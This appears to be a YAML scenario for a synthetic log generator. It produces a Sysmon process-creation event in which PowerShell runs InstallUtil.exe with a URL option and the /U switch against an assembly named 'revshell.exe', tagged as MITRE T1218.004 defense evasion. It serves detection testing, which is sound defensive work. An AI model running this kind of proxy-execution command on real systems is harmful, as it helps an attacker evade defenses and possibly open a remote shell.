type: scenario
description: |
  InstallUtil.exe runs the installer classes of an assembly with a URL among
  its command-line options. Sysmon EID 1 (Process Create) records a parent
  process, for example powershell.exe, starting the .NET Framework
  InstallUtil.exe with an installer option that carries an http:// or
  https:// URL, for example `/server=http://192.168.1.1/Y0DNA`, and the `/U`
  switch, which runs the uninstall methods of the installer classes in an
  assembly, for example revshell.exe. InstallUtil.exe hands options it does
  not recognize to those installer classes and does not fetch the URL itself;
  the event records the command, not what the assembly did with the URL.
tags: [eid1]
mitre:
  tactics: [defense-evasion]
  techniques: [T1218.004]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:            gen.hostname(class=windows-server, domain=ref.domain_fqdn)
  sysmon_pid:          gen.int(min=1000, max=4000)
  sysmon_tid:          gen.int(min=1000, max=9999)
  event_record_id:     gen.int(min=5000, max=9999999)
  user_name:           Administrator
  user:                "${ref.domain_short}\\${ref.user_name}"
  current_directory:   "C:\\Users\\${ref.user_name}\\Desktop\\"
  logon_guid_raw:      fn.upper(gen.uuid())
  logon_guid:          "{${ref.logon_guid_raw}}"
  logon_id_hex:        gen.hex(len=5, case=lower)
  logon_id:            "0x${ref.logon_id_hex}"
  process_guid_raw:    fn.upper(gen.uuid())
  process_guid:        "{${ref.process_guid_raw}}"
  process_id:          gen.int(min=100, max=9999)
  parent_guid_raw:     fn.upper(gen.uuid())
  parent_process_guid: "{${ref.parent_guid_raw}}"
  parent_process_id:   gen.int(min=1000, max=9999)
  installer_option:    "/server=http://192.168.1.1/Y0DNA"
  assembly:            revshell.exe
  command_line:        "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe\" ${ref.installer_option} /U ${ref.assembly}"
  parent_image:        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  parent_command_line: "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
            - "@Name": FileVersion
              "#text": "4.8.3761.0 built by: NET48REL1"
            - "@Name": Description
              "#text": ".NET Framework installation utility"
            - "@Name": Product
              "#text": "Microsoft® .NET Framework"
            - "@Name": Company
              "#text": Microsoft Corporation
            - "@Name": OriginalFileName
              "#text": InstallUtil.exe
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": 2
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": "MD5=AF862061889F5B9B956E9469DCDAE773,SHA256=AF5CBD35C7D8DEA7D879113FDA61B0F64AC6618BCDAE15C0C732A018BABF68EE"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": ref.parent_image
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
